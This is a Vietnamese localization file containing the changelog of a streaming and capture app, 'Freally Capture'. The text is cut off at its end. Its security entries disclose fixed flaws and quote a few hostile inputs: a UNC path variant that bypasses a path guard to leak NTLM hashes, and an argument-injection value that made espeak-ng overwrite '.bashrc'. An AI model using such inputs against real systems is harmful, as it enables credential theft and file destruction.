(function (all) { var mine = all["vi"] = all["vi"] || {}; var add = {"changelog.55f272992501":"Mọi thay đổi đáng chú ý của Freally Capture sẽ được ghi lại trong tệp này.","changelog.34cd2e6013c5":"Định dạng dựa trên <a href=\"https://keepachangelog.com/en/1.1.0/\">Keep a Changelog</a>, và dự án này cố gắng tuân theo <a href=\"https://semver.org/spec/v2.0.0.html\">Semantic Versioning (đánh số phiên bản theo ngữ nghĩa)</a>.","changelog.b6512e169100":"<strong>Trạng thái: ổn định.</strong> <strong>1.0.0</strong> đã hoàn thành lộ trình 100 tính năng được đếm (toàn bộ 26 tính năng bắt buộc CAP-M + toàn bộ 74 tính năng nên có CAP-N) cùng năm tính năng hoàn thiện cho đợt ra mắt. <strong>1.1.0</strong> bổ sung tính năng tự động xuất còn nợ từ Build 12, và <strong>1.2.0</strong> bổ sung ba tính năng cuối cùng: camera ảo, nguồn trình duyệt thực thụ và ghi trò chơi. <strong>1.2.1</strong> là đợt rà soát Operation_Optimization: không có tính năng mới, nhưng là một lượt kiểm tra bảo mật và tính đúng đắn trên toàn bộ mã nguồn — và ba bổ sung của 1.2.0 nay đã thực sự truy cập được và hoạt động. Các bậc bên dưới ghi lại hành trình đi tới đây, từ bản MVP studio 0.70.0 trở lên.","changelog.bd0bded7ecb3":"[1.2.1] — 2026-08-20 (Operation_Optimization — rà soát, gia cố &amp; đưa tính năng vào tầm với)","changelog.52c9ccef246a":"<strong>Một đợt rà soát toàn bộ mã nguồn, và những bản sửa lỗi mà nó tìm ra.</strong> Mọi phần của ứng dụng — toàn bộ khoảng 147 nghìn dòng trên 13 phần — đều đã đi qua <code>/simplify</code>, <code>/security-review</code> và <code>/code-review</code>. Không có gì mới được thêm vào. Điều thay đổi là một số thứ đã được <em>phát hành</em> trong 1.2.0 nay thực sự <strong>hoạt động</strong>: ghi trò chơi không với tới được tựa game hiện đại nào, camera ảo hoàn toàn không thể khởi động, và nguồn trình duyệt bị ẩn khỏi menu. Bên cạnh đó, một lớp bảo vệ đường dẫn mà mọi lớp bảo vệ khác trong ứng dụng đều dựa vào có thể bị vượt qua chỉ bằng một ký tự.","changelog.b16452720739":"Đã sửa — bảo mật","changelog.d62edfd54f4e":"<strong>Lớp bảo vệ đường dẫn mạng bỏ sót hai cách viết UNC mà Windows chấp nhận.</strong> <code>is_remote</code> kiểm tra <code>\\\\</code> và <code>//</code> nhưng không kiểm tra <code>/\\</code> hay <code>\\/</code>, trong khi Win32 coi hai dấu phân cách là như nhau trong tiền tố hai ký tự đó — <code>GetFullPath(&quot;/\\localhost\\C$\\Windows&quot;)</code> thực sự phân giải thành <code>\\\\localhost\\C$\\Windows</code>. Vì chính điều kiện này làm nền cho <em>mọi</em> bước kiểm tra đường dẫn trong ứng dụng (bản ghi, mở thư mục, nhập gói, chuỗi xử lý, tự động hóa và sáu lớp bảo vệ của studio), chỉ cần thay một ký tự là đã tạo được một kết nối SMB thật và làm lộ mã băm thông tin xác thực NTLM tới một máy chủ do kẻ tấn công chỉ định. Giờ cả hai dấu phân cách đều được chuẩn hóa và khoảng trắng ở đầu được cắt bỏ.","changelog.57f43b5bfb70":"<strong>Việc chèn mã để ghi trò chơi tin vào một pid có thể đã bị tái sử dụng.</strong> <code>inject()</code> kiểm tra sự đồng ý dựa trên tên tệp thực thi mà <em>bên gọi</em> truyền vào, chứ không bao giờ dựa trên tiến trình mà nó thực sự mở — và Windows tái sử dụng pid rất nhanh trong khoảng giữa lúc tra cứu cửa sổ và <code>OpenProcess</code>. Giờ nó truy vấn tên image từ handle đang mở và kiểm tra lại sự đồng ý trước <code>CreateRemoteThread</code>.","changelog.14fb39bd677f":"<strong>WHIP chấp nhận <code>http://</code>.</strong> Với WHIP, khóa phát <em>chính là</em> bearer token, nên một điểm cuối không mã hóa sẽ gửi thông tin xác thực đi dưới dạng văn bản thô ở mỗi lần kết nối lại. Giờ chỉ chấp nhận <code>https</code>.","changelog.e53e8143a9a0":"<strong><code>espeak-ng</code> thiếu <code>--</code> trước văn bản của người dùng</strong> (nhánh <code>spd-say</code> đã có sẵn), nên một dòng máy nhắc chữ như <code>-w/home/user/.bashrc</code> khiến nó ghi một tệp WAV đè lên tệp đó.","changelog.27867a99df1e":"<strong>Quy tắc “chỉ đường dẫn tuyệt đối” của NDI là một <code>debug_assert!</code></strong> — bị loại bỏ khi biên dịch bản phát hành, khiến một biến môi trường mà người dùng ghi được có thể điều hướng <code>LoadLibraryW</code> tới một đường dẫn tương đối.","changelog.e7e404533641":"<strong>Token mời khách mời từ xa đã được chuyển khỏi chuỗi truy vấn</strong> sang phần fragment của URL, nên nó không còn lọt vào nhật ký truy cập của Pages, lịch sử trình duyệt hay header <code>Referer</code> gửi sang nguồn gốc khác.","changelog.db73bbe95da1":"<strong>Mật khẩu nhận luồng SRT được che đi</strong>, giống như mọi trường bí mật khác trong ứng dụng.","changelog.e6d73277285d":"Đã sửa — sự cố và tính đúng đắn","changelog.66b4f9443b67":"<strong>Bộ ghép hình có thể panic trên luồng kết xuất.</strong> Nó xóa toàn bộ bộ nhớ đệm pipeline của shader người dùng giữa khung hình trong khi <code>compose_scene</code> vẫn giữ các kế hoạch trỏ vào đó, rồi gọi <code>.expect()</code> — chỉ cần hai bộ lọc shader và việc chỉnh sửa trực tiếp thông thường là gặp, vì mỗi lần gõ phím trong trình soạn shader lại tạo ra một mã băm mới. Giờ các lần tra cứu có thể thất bại một cách an toàn, và việc loại bỏ chỉ xóa các bản biên dịch lỗi.","changelog.b9e2ec0e1165":"<strong>Chưa có trình xử lý lỗi không bắt được (uncaptured error) của wgpu</strong>, nên bất kỳ lỗi xác thực hay lỗi hết bộ nhớ nào trong bộ ghép hình cũng làm tiến trình panic. Giờ lỗi được ghi vào nhật ký và khung hình đó bị bỏ qua.","changelog.b8bd5c6887ba":"<strong>Các nhóm bị ẩn xuất hiện trên sóng trong lúc chuyển cảnh Move</strong> — mọi đường ghép hình khác đều tuân theo <code>group_hides</code>; đường morph thì không, nên các mục bị ẩn vẫn bị ghi và phát đi trong suốt quá trình chuyển cảnh.","changelog.a87472f8edb5":"<strong>Phát trực tiếp và phát lại giờ từ chối khung hình sai kích thước.</strong> Khung vẽ có thể thay đổi giữa phiên còn bộ mã hóa nhận khung hình thô có kích thước cố định, nên chỉ một bộ đệm sai kích thước cũng làm lệch luồng byte cho đến hết buổi phát, trong khi trạng thái vẫn hiện “trực tiếp”.","changelog.42b801d420c3":"<strong>Tình trạng thiếu dữ liệu âm thanh (underrun) không có cơ chế phục hồi.</strong> Một khi bộ đệm trước 30 ms cạn, mọi khối sau đó đều là khối thiếu được ghép với khoảng lặng — tiếng lẹt xẹt kéo dài chứ không phải một trục trặc đơn lẻ.","changelog.b31061525f09":"Các id mục trùng nhau không còn đánh chỉ mục vượt quá bộ nhớ đệm chuỗi bộ lọc; thời lượng mờ dần là NaN sẽ bỏ qua bộ lọc thay vì ẩn nguồn mãi mãi; ảnh mặt nạ quá cỡ bị từ chối thay vì làm wgpu panic; và <code>fader_gain</code> được bổ sung lớp bảo vệ <code>is_finite</code> mà hàm anh em của nó đã có (một giá trị NaN ở đó sẽ bám dính và làm hỏng vĩnh viễn bản trộn tổng, LUFS và bản ghi).","changelog.c77e993871b2":"Đã sửa — CAP-N78 ghi trò chơi nay hoạt động với các tựa game hiện đại","changelog.9f9efaee9c7f":"<strong>Chỉ <code>IDXGISwapChain::Present</code> được hook.</strong> Các trò chơi <strong>flip-model</strong> DXGI 1.2+ — phần lớn những gì chạy ở chế độ toàn màn hình độc quyền — hiển thị qua <code>Present1</code> và không bao giờ chạm tới vị trí đó, nên việc chèn mã báo thành công nhưng không một khung hình nào đến được. Giờ cả hai vị trí đều được hook, và được bao phủ bởi một bài kiểm thử đầu-cuối dựng một swap chain flip-model thật, chỉ hiển thị qua <code>Present1</code> và đọc lại khung hình đã ghi được.","changelog.77d8a35def9c":"<strong>Tình trạng mất thiết bị (device-lost) đã được xử lý.</strong> Texture dùng chung ghi lại thiết bị đã tạo ra nó, nên một lần TDR hay một lần alt-tab ra khỏi toàn màn hình độc quyền sẽ dựng lại texture thay vì sao chép giữa hai thiết bị.","changelog.b122bc48cff9":"<strong>Nhiều swap chain không còn làm texture dùng chung bị dựng lại liên tục</strong> ở mỗi lần hiển thị (một cửa sổ launcher, một khung nhìn trình chỉnh sửa hay một màn hình chờ từng buộc dựng lại ở độ phân giải đầy đủ hơn 60 lần mỗi giây); swap chain đầu tiên được chốt.","changelog.fda7f3673f30":"<strong>Các back buffer đa mẫu (multisampled) được resolve</strong> thay vì làm <code>CopyResource</code> thất bại trong im lặng.","changelog.b3bac7144e62":"<strong>Vtable thực sự được khôi phục khi gỡ tải</strong> — một cách tường minh từ <code>DLL_PROCESS_DETACH</code>, và chỉ khi các vị trí vẫn giữ hàm của chúng ta, nên một lớp phủ hook sau đó không bao giờ bị gỡ hook trong im lặng. (Tuyên bố trước đây rằng <code>Drop</code> của <code>HookState</code> làm việc này là sai: Rust không bao giờ drop các biến static.)","changelog.27986d7f86bc":"<strong>Một tựa game D3D12 giờ thất bại nhanh và trung thực</strong> thay vì chờ hết thời gian chờ khung hình đầu tiên, và DLL được chèn không còn ghi ra stderr — một trò chơi thuộc hệ con GUI không có handle stderr, và với <code>panic = &quot;abort&quot;</code> một lần ghi thất bại đã làm <em>trò chơi</em> bị hủy.","changelog.dd55e1058c26":"Luồng kết xuất của trò chơi không còn phải chờ keyed mutex 4 ms ở mỗi lần hiển thị.","changelog.3f346cd6bbf4":"Đã sửa — cuối cùng đã dùng được","changelog.ef07cd87f669":"<strong>Nguồn trình duyệt đã có trong menu Thêm.</strong> Nó được phát hành hoàn chỉnh trong 1.2.0 nhưng nằm sau một cờ bị tắt, và menu vẫn bảo người vận hành dùng Chụp Cửa sổ thay thế.","changelog.3ff4af9be26b":"<strong>Camera ảo đã có thể khởi động.</strong> Phần backend đã hoàn chỉnh nhưng không có gì gọi tới nó: không có lệnh bắt đầu/dừng và nút bấm bị mã hóa cứng ở trạng thái vô hiệu. Giờ nó được nối thông từ đầu đến cuối, rẽ nhánh từ bước đọc lại chương trình <em>sẵn có</em>, nên việc bật nó chỉ tốn thêm một lần xuất bản cho mỗi khung hình vốn đã được đọc. Vẫn chưa được ký mã, và vẫn còn nợ một bài thử thực tế với Zoom/Meet/Teams.","changelog.01041cd1674e":"Đã thay đổi — hiệu năng","changelog.ae778ae72eb2":"Bốn đường giải mã sao chép toàn bộ khung hình ở mỗi khung; bộ ghép hình hủy và dựng lại mọi texture của chuỗi bộ lọc 60 lần/giây (bộ nhớ đệm bị tỉa ở mỗi lần ghép, nhưng việc ghép chạy cho chương trình, bản xem trước, khung dọc, cảnh lồng nhau, ảnh thu nhỏ, máy chiếu và cả hai nửa của một chuyển cảnh); việc ghi <code>.frec</code> thực hiện một lời gọi hệ thống mỗi khung hình và sao chép 8 MB trước khi trừ; FLZ cấp phát một bảng 64 KiB cho mỗi lát và bộ giải mã cấp phát một bộ đệm rồi lập tức sao chép đi; <code>sanitize</code> có độ phức tạp bậc hai ở mỗi lần tải và nhập; hộp thư ghi hình giải phóng một khung hình 8 MB bên trong khóa mà bên tiêu thụ của nó đang chờ.","changelog.8800583b308d":"<strong>Các giá trị âm thanh denormal được xả về 0.</strong> Với <code>forbid(unsafe_code)</code>, bit flush-to-zero của MXCSR không dùng được, nên các dải kênh bị tắt tiếng suy giảm vào vùng denormal và nằm lại đó, tốn gấp 10–100 lần cho mỗi mẫu.","changelog.70947783a47e":"Đã thêm — độ bền vững và công cụ","changelog.cc7a8bef1645":"<strong>Một error boundary của React</strong>, được nối vào hai lớp vỏ dùng chung (<code>PickerShell</code>, được 59 tệp nhập, và <code>Panel</code>). Trước đây một lỗi ném ra khi kết xuất sẽ gỡ toàn bộ studio trong khi phía Rust vẫn tiếp tục mã hóa và phát — không bị rớt sóng, nhưng mù và không thể dừng. Giờ một hộp thoại bị lỗi vẫn giữ được nút đóng.","changelog.c7dc2964a7e9":"<strong>Hai bài kiểm thử khói giao diện vẫn đạt trên một màn hình trống.</strong> <code>11-recordings</code> và <code>19-profiles</code> đều đúng 4.255 byte: bản giả lập không bao giờ định nghĩa các lệnh mà những hộp thoại đó đọc, ứng dụng bị gỡ, và vòng lặp không khẳng định điều gì. Bản giả lập được bổ sung 16 lệnh và một bộ dữ liệu cài đặt đầy đủ, và vòng lặp giờ khẳng định hộp thoại thực sự hiển thị.","changelog.e020b3ffc504":"<strong>Fuzzing.</strong> Các lượt quét đầu vào sai định dạng có tính tất định cho bộ giải nén <code>.frec</code> và bộ phân tích capture-id chạy trong bộ kiểm thử thông thường trên cả ba hệ điều hành, cùng một bộ khung <code>cargo-fuzz</code> — 77.625.230 lần thực thi trên <code>flz::decompress_into</code> mà không có sự cố nào.","changelog.f52e2bae0c8f":"<code>docs/local-security-tooling.md</code> ghi lại các trình quét chỉ chạy cục bộ đã được dùng (Semgrep: 0 phát hiện; Trivy: 0 bí mật, 0 mức cao/nghiêm trọng) và, một cách thẳng thắn, lý do Miri <em>không</em> đáng để thêm vào đây: cả mười hai crate thư viện đều đã <code>deny(unsafe_code)</code>, và phần unsafe còn lại là FFI, thứ mà Miri không thể thực thi.","changelog.30ae102eb166":"[1.2.0] — 2026-08-19 (Ghi hình chuyên sâu &amp; Web)","changelog.c240db164d51":"<strong>Ba bổ sung cuối cùng cho ứng dụng.</strong> Camera ảo, nguồn trình duyệt thực thụ và ghi trò chơi qua một hook hiển thị GPU được chèn vào. Cả ba đều ưu tiên Windows trước, với tình trạng trên từng hệ điều hành được nêu thẳng thắn chứ không làm giả. Hai trong số đó phát hành kèm các thành phần <strong>chưa được ký mã</strong>, và các bài thử tình huống thực tế (camera hiển thị trong một ứng dụng hội nghị; chèn vào một tựa game có bảo vệ) vẫn còn nợ — cả hai đều được nêu rõ trong các ghi chú bên dưới thay vì bị che đậy.","changelog.6b02e0d363a4":"Đã thêm","changelog.15c7060f73c9":"<strong>Ghi trò chơi qua một hook hiển thị GPU được chèn vào (CAP-N78, Windows).</strong> Giờ có thể ghi một trò chơi qua chính <code>Present</code> của swap chain của nó — dành cho các tựa game toàn màn hình độc quyền mà tính năng ghi cửa sổ WGC không với tới được, ở đúng tốc độ hiển thị gốc của trò chơi. Tính năng này <strong>hoàn toàn phải được bật riêng cho từng tựa game</strong>: không có gì được chèn cho đến khi bạn chấp nhận rủi ro chống gian lận/phần mềm diệt virus được nói thẳng cho chính trò chơi đó (một <code>Consent</code> giới hạn trong một tệp thực thi, chỉ được tạo từ một xác nhận tường minh — nó không bao giờ có thể bị dùng lại cho trò chơi khác), và một tựa game từ chối hook sẽ chuyển xuống Chụp Cửa sổ sẵn có kèm một thông báo trung thực, không bao giờ gây sự cố. Nguồn ▸ Chụp Trò chơi (đọc trước) → chấp nhận → chọn trò chơi. DLL hook chỉ vá vtable DXGI, sao chép mỗi back buffer vào một texture dùng chung có keyed mutex, và khôi phục vtable khi gỡ tải; một khung hình đang bận sẽ bị bỏ qua để trò chơi không bao giờ bị khựng vì chúng ta. Back buffer HDR được chuyển sang WGC (nơi bộ ghép hình của màn hình nền ánh xạ tông màu) thay vì bị đọc nhầm thành 8 bit. Crate mới <code>freally-game-hook</code>; giao thức nằm trong <code>design/game-hook-protocol.md</code>.","changelog.8a03cfb2c221":"<strong>Camera ảo (CAP-N76, Windows).</strong> Chương trình đã ghép được đưa tới một “Freally Capture Virtual Camera” qua một kênh truyền bộ nhớ dùng chung bộ đệm kép không khóa (<code>fcap_stream::vcam::transport</code>) và vòng đời <code>MFCreateVirtualCamera</code> của Media Foundation (<code>fcap-vcam-win</code>), vốn gỡ thiết bị khi dừng <em>và</em> khi drop để không có camera “xác sống” nào còn sót lại. Nguồn frame-server được đăng ký là một DLL COM <code>IMFMediaSource</code> thực thụ (<code>freally-vcam-source</code>), tự đăng ký cho từng người dùng (không cần quyền quản trị) và cung cấp khung hình của ứng dụng dưới dạng luồng RGB32 — cùng mô hình thành phần tải theo yêu cầu, có xác minh mã băm như các cầu nối ffmpeg/CEF. <code>virtual_camera_status</code> đưa tình trạng sẵn có thực tế lên giao diện; camera chạy không ký mã cho người dùng hiện tại, và ký mã là bước duy nhất còn chờ trước khi phát hành. macOS (CoreMediaIO) và Linux (v4l2loopback) là các thành phần riêng.","changelog.7f566bdedc82":"<strong>Nguồn trình duyệt thực thụ — backend CEF OSR (CAP-N77).</strong> Một trang http/https bất kỳ được kết xuất ngoài màn hình qua CEF ở độ phân giải/fps đã chọn và truyền tới bộ ghép hình dưới dạng <code>FBH1</code> + các khung hình kích thước cố định. Backend (<code>crates/browser-host --features cef</code>) liên kết libcef từ thành phần CEF đã ghim phiên bản và xác minh mã băm, và đưa <strong>mọi</strong> lần điều hướng qua danh sách cho phép dùng chung (một lần chuyển hướng tới <code>file://</code>/<code>javascript:</code> sẽ bị hủy, không bao giờ được đi theo). Đã kiểm chứng đầu-cuối trên Windows: một URL đang hoạt động được kết xuất thành khung hình thật và tắt sạch khi stdin gặp EOF. Môi trường chạy chỉ được tải về ở lần dùng đầu tiên (không bao giờ đóng gói kèm); ký mã cho từng hệ điều hành là bước phát hành còn lại.","changelog.8f6fb4eb7f42":"Bảo mật","changelog.2e30d476c4fe":"<strong>Nguồn trình duyệt giờ chạy sandbox trình kết xuất của Chromium trên Windows.</strong> Tiến trình chủ kết xuất các trang web bất kỳ, và một trang có thể đến từ một bộ sưu tập cảnh được nhập, vậy mà trước đây nó khởi động Chromium với sandbox bị tắt — đó là biện pháp kiểm soát duy nhất ngăn một trang bị xâm nhập trở thành việc thực thi mã dưới danh nghĩa bạn. Windows giờ chạy trong sandbox. macOS và Linux tạm thời vẫn chưa có sandbox (sandbox trên Linux cần một trình trợ giúp có đặc quyền mà thành phần này chưa kèm theo), và điều này được ghi rõ trong mã chứ không để trông như cố ý.","changelog.17f0a576df73":"<strong>Sự đồng ý cho Ghi trò chơi không còn đi kèm trong bộ sưu tập cảnh.</strong> Một bộ sưu tập là một tài liệu có thể chia sẻ — một <code>.fcappack</code>, một bản nhập từ OBS, một ảnh chụp nhanh, một tệp sửa tay — nên nó không bao giờ được phép mang theo quyền chèn một DLL vào tiến trình khác. Trước đây thì có thể: cờ “Tôi chấp nhận rủi ro chống gian lận” là một trường trong tài liệu, và một gói nhận được có nguồn Ghi trò chơi trỏ tới bất kỳ tệp thực thi nào sẽ chèn vào đó ngay khi nhập, không hỏi gì và không bao giờ hiện nội dung cảnh báo rủi ro. Giờ việc tải một bộ sưu tập luôn xóa cờ đó (có bài kiểm thử hồi quy bao phủ), nên một bố cục được nhập sẽ chuyển xuống Chụp Cửa sổ thông thường cho đến khi người vận hành bật lại qua trình chọn — nơi duy nhất cảnh báo thực sự được hiển thị.","changelog.5d0d9a1170f9":"<strong>Sự đồng ý giờ gắn với đúng tệp thực thi mà người dùng đã thực sự chấp thuận.</strong> Trước đây nó được tạo từ tệp thực thi được phân giải lúc khởi động rồi được kiểm tra với chính chuỗi đó, nên bước kiểm tra không bao giờ có thể thất bại và cam kết đã ghi trong tài liệu “sự đồng ý cho <code>game-a.exe</code> không bao giờ có thể bị dùng lại cho <code>game-b.exe</code>” không hề tồn tại lúc chạy. Giờ sự đồng ý được cấp cho chương trình được ghi lại khi chọn nguồn và được đối chiếu với chương trình mà cửa sổ hiện phân giải tới, nên một nguồn gắn lại sang tiến trình khác sẽ bị từ chối thay vì bị chèn mã.","changelog.4118fb4fed0e":"Đã gỡ bỏ","changelog.a76a693b9e23":"<strong>Tích hợp Freally Central (“Thêm ứng dụng Freally”).</strong> Freally Central không còn tồn tại, nên submodule <code>vendor/freally-central</code> được đưa vào kho và mọi thứ phụ thuộc vào nó đã bị gỡ bỏ: phụ thuộc crate <code>freally-central-engine</code> và bảy lệnh Tauri <code>central_*</code> của nó, mục menu <strong>Trợ giúp → Thêm ứng dụng Freally</strong> cùng hộp thoại của nó, cầu nối chủ đề <code>fcp-*</code> của bảng điều khiển, các bí danh tsconfig/vite <code>@freally/central-panel</code>, và các danh mục ngôn ngữ <code>fcp-*</code> được đưa vào kho vốn được xếp lớp vào mọi gói. Capture không còn phụ thuộc vào một kho mã đã biến mất — một lần clone mới và lần checkout CI giờ đều thành công, trong khi submodule bị thiếu lẽ ra đã làm chúng thất bại.","changelog.1246fc93bca0":"Đã sửa","changelog.3e3cbc39c891":"<strong>Tiến trình chủ của trình duyệt giờ được tắt sạch sẽ thay vì bị buộc dừng ngay.</strong> Tiến trình chủ được khởi chạy với stdin trỏ tới <code>/dev/null</code>, khiến tín hiệu “stdin đóng → thoát với mã 0” đã ghi trong giao thức không thể gửi được — nên mỗi lần dừng đều là một lần buộc dừng, bỏ mồ côi các tiến trình con kết xuất/GPU của chính CEF. Giờ stdin của nó là một pipe đang hoạt động, và việc đóng pipe cho tiến trình chủ một khoảng ân hạn có giới hạn (500 ms) để tự thoát trước khi bị buộc dừng. Giới hạn này là có chủ ý: <code>stop()</code> chờ luồng bơm kết thúc, nên việc này nằm trên đường đối chiếu trạng thái của studio và không bao giờ được làm kẹt một lần đổi cảnh.","changelog.158d17057e90":"<strong>Trình tải môi trường chạy CEF được ghim vào dòng phiên bản mà tiến trình chủ được dựng theo.</strong> Trước đây nó lấy bất cứ bản nào mà <code>index.json</code> gọi là mới nhất. CEF không ổn định ABI giữa các phiên bản chính, và tiến trình chủ từ chối một môi trường chạy mà nó không được dựng theo, nên “mới nhất” có thể tốn một lần tải khoảng 100 MB chỉ để có một nguồn Trình duyệt đi vào ngõ cụt. Giờ bản dựng <code>minimal</code> ổn định mới nhất <em>trong</em> phiên bản chính đã ghim sẽ được chọn, vẫn nhận được các bản vá bảo mật Chromium trong dòng đó.","changelog.7416b5a9ae50":"<strong>Quy tắc chỉ http/https giờ áp dụng cho cả chuyển hướng, không chỉ URL ban đầu.</strong> Một trang phục vụ qua http có thể chuyển hướng — 302, <code>location.href</code>, <code>window.open</code>, một khung con — tới <code>file://</code> và đọc tệp cục bộ, hoặc tới <code>javascript:</code>/<code>data:</code> để chạy script mà người vận hành chưa bao giờ chọn. Danh sách cho phép là một cổng kiểm tra duy nhất đã được kiểm thử (<code>is_allowed_url</code>) mà backend CEF giờ bắt buộc phải gọi từ trình xử lý điều hướng của nó, nên quy tắc argv và quy tắc chuyển hướng không thể lệch nhau.","changelog.d70c33477501":"<strong>Biểu ngữ thành phần trong trình chọn Trình duyệt theo dõi quá trình cài đặt thay vì đứng yên từ lúc mở.</strong> Nó chỉ đọc trạng thái môi trường chạy một lần khi gắn kết, nên việc cài đặt từ Công cụ → Thành phần trong khi trình chọn đang mở khiến nó vẫn báo thành phần bị thiếu. Giờ nó đăng ký nhận sự kiện <code>cef</code>, và phân biệt bốn trạng thái: chưa cài đặt, đang cài đặt, cài đặt thất bại (kèm lý do), và một nền tảng mà CEF không phát hành bản dựng nào — nơi lời khuyên “hãy cài từ Thành phần” sẽ không bao giờ thành công.","changelog.de0da2df5676":"<strong>Đường nối backend CEF của tiến trình chủ trình duyệt được lint trong CI.</strong> <code>--features cef</code> chỉ được dựng ở mốc thành phần, nên nó đã trôi dần vào trạng thái không qua được <code>clippy -D warnings</code> và lẽ ra sẽ làm hỏng bản dựng đó ngay lần chạy đầu tiên. Giờ CI lint đường nối này ở mỗi lần push.","changelog.63e7bdb09d63":"<strong>Ghi trò chơi trụ được qua việc đổi kích thước hay alt-tab.</strong> Handle texture dùng chung có tên của phía sản xuất được tạo ra rồi bị bỏ mặc, nên cái tên vẫn được đăng ký suốt vòng đời tiến trình trò chơi. Mỗi lần thay đổi kích thước sau đó đều cố tạo lại texture dưới một cái tên vẫn còn tồn tại, thất bại với <code>DXGI_ERROR_NAME_ALREADY_EXISTS</code>, và việc ghi hình chết hẳn mà không có thông báo nào. Giờ handle được sở hữu và đóng đúng cách, và texture cũ được giải phóng trước khi dựng texture thay thế.","changelog.0a3b42e6c8d3":"<strong>Lần thêm Chụp Trò chơi đầu tiên không còn âm thầm quay về Chụp Cửa sổ.</strong> Việc chèn mã trả về ngay khi <code>LoadLibraryW</code> từ xa trả về, nhưng <code>DllMain</code> chỉ <em>khởi chạy</em> luồng kích hoạt — khối điều khiển chưa tồn tại cho đến khi luồng đó dựng xong một thiết bị và một swap chain giả. Ứng dụng gắn vào ngay lập tức và luôn thua cuộc đua đó. Giờ nó chờ (có giới hạn) cho đến khi hook thực sự được kích hoạt.","changelog.b97f30288a77":"<strong>Một trò chơi đã bị hook khi thoát sẽ giải phóng nguồn.</strong> <code>FLAG_PRODUCER_ALIVE</code> không bao giờ được xóa — một trò chơi bị buộc tắt hoặc gặp sự cố sẽ không bao giờ chạy <code>DLL_PROCESS_DETACH</code> — nên khối điều khiển cuối cùng vẫn tồn tại với cờ được bật và luồng bơm cứ quay mãi trên khung hình cuối, không bao giờ đóng và không bao giờ kích hoạt tự phục hồi. Giờ ứng dụng hỏi hệ điều hành xem trò chơi còn đang chạy hay không.","changelog.8f6e3e5d64ef":"<strong>Một trò chơi tải hook chậm không còn có nguy cơ gặp sự cố.</strong> Khi hết thời gian chờ chèn mã, trang bộ nhớ từ xa bị giải phóng trong khi <code>LoadLibraryW</code> của trò chơi có thể vẫn đang đọc nó. Giờ trang chỉ được giải phóng khi luồng đó đã thoát một cách rõ ràng.","changelog.76d466ce9bcf":"<strong>Một lần kích hoạt thất bại có thể được thử lại.</strong> Nếu việc ánh xạ khối điều khiển thất bại, cờ “đã cài đặt” vẫn bị để bật, nên tiến trình mãi ở trạng thái kích hoạt nửa vời: đã bị chèn mã, không bao giờ xuất bản và không thể phục hồi. Trạng thái hook giờ cũng được xuất bản <em>trước khi</em> vị trí vtable được vá — một lần hiển thị rơi vào giữa hai bước sẽ không thấy trạng thái nào và trả về <code>S_OK</code> mà không chuyển tiếp tới <code>Present</code> thật, âm thầm nuốt mất lần lật của khung hình đó.","changelog.1fdb03f5eeaf":"<strong>DLL nguồn của camera ảo không còn có thể bị gỡ tải khi đang được dùng.</strong> <code>DllCanUnloadNow</code> trả lời <code>S_OK</code> vô điều kiện — mà export đó <em>chính là</em> cách COM hỏi — nên một lệnh <code>CoFreeUnusedLibraries</code> trong tiến trình chủ frame-server có thể gỡ tải nó trong khi một ứng dụng hội nghị vẫn giữ nguồn media. Giờ nó báo số lượng đối tượng và khóa máy chủ thực tế. <code>Shutdown</code> cũng phá vòng tham chiếu mạnh nguồn↔luồng vốn làm rò rỉ mỗi lần mở camera.","changelog.686194fae62e":"<strong>Hai chuỗi hiển thị cho người dùng có những dãy khoảng trắng thừa</strong> do ngắt dòng để lại (thông báo lỗi Thành phần về CEF đã ghim và chú giải công cụ của camera ảo trên các hệ không phải Windows).","changelog.faf05b9b72f7":"[1.1.0] — 2026-07-20 (Ghi hình chuyên sâu &amp; Web — Giai đoạn 10, phần đầu tiên)","changelog.4eb7f2b2ea1d":"<strong>Chiều sâu sau 1.0 bắt đầu.</strong> Giai đoạn 10 mở ra ba mảng ghi hình lâu nay vẫn “là mốc riêng” — camera ảo, nguồn trình duyệt thực thụ và ghi trò chơi — thành một đợt xây dựng được lên lịch đàng hoàng. Bản phát hành này mang tới phần đã hoàn chỉnh và độc lập: <strong>tự động xuất một bản sao dễ chia sẻ khi dừng (CAP-N75)</strong>, tính năng trong lộ trình còn nợ từ Build 12. Môi trường chạy của nguồn trình duyệt và camera ảo là các mốc phụ cần ký mã/thành phần, sẽ đến trong các bản phát hành sau; hiện chưa có gì của chúng hiển thị cho người dùng. Mọi thứ mới đều tắt theo mặc định, chạy cục bộ và không thêm lời gọi mạng nào.","changelog.f4bd0df9d9a9":"<strong>Tự động xuất một tệp MP4 dễ chia sẻ khi dừng (CAP-N75)</strong> — một nút bật/tắt trong <strong>Cài đặt → Đầu ra</strong>, <em>“Cũng lưu một MP4 chia sẻ được cạnh bản gốc”</em> (chỉ hiện khi ghi ra định dạng <code>.frec</code> riêng, <strong>tắt theo mặc định</strong>). Khi một bản ghi <code>.frec</code> hoàn tất, một tác vụ xuất chạy nền sẽ ghi một bản sao MP4 phát được bằng cách nhấp đúp ngay bên cạnh — hiển thị trong hàng đợi sau ghi hình của hộp thoại Bản ghi — qua cùng đường mã hóa mà thao tác xuất thủ công dùng, với cách đặt tên tránh trùng. Bản gốc <code>.frec</code> không mất dữ liệu không bao giờ bị động tới, và bản sao được đưa vào hàng đợi trước mọi chuỗi xử lý sau ghi hình để một bước Di chuyển không thể dời bản gốc đi mất. Vừa giữ bản gốc cứu được khi gặp sự cố <strong>vừa</strong> có một tệp dễ chia sẻ mà không tốn gì thêm.","changelog.8a7525b1492f":"Ghi chú","changelog.684a3421d35f":"Phần nền móng đã có (chưa hiển thị cho người dùng trong bản phát hành này): phía ứng dụng của <strong>nguồn trình duyệt thực thụ</strong> (CAP-N77) cùng kiến trúc CEF chạy trong tiến trình trợ giúp, và đường nối truyền tải của <strong>camera ảo</strong> — cả hai đều chờ các môi trường chạy cần ký mã/thành phần, được phát hành như những mốc phụ riêng. Xem Giai đoạn 10 trong lộ trình.","changelog.1255703a672a":"[1.0.0] — 2026-07-19 (Ổn định — Lớp phủ sản xuất buổi phát &amp; hoàn thiện cho đợt ra mắt)","changelog.c682627010fd":"<strong>Bản ổn định 1.0.0.</strong> Cột mốc 100 tính năng được đếm (26 tính năng bắt buộc CAP-M + 74 tính năng nên có CAP-N) đã đạt được ở 0.900.0; bản phát hành này mang tới năm tính năng hoàn thiện cho đợt ra mắt được để dành cho 1.0.0 — màn hình đếm ngược trước chương trình, thanh mạng xã hội, biểu ngữ tin nhắn trò chuyện nổi bật, hiệu ứng độ sâu trường ảnh cho hộp thoại và dọn dẹp lịch sử cảnh — cùng một loạt bản sửa lỗi cho trình phát và âm thanh. Mọi thứ mới đều tắt/không gán phím theo mặc 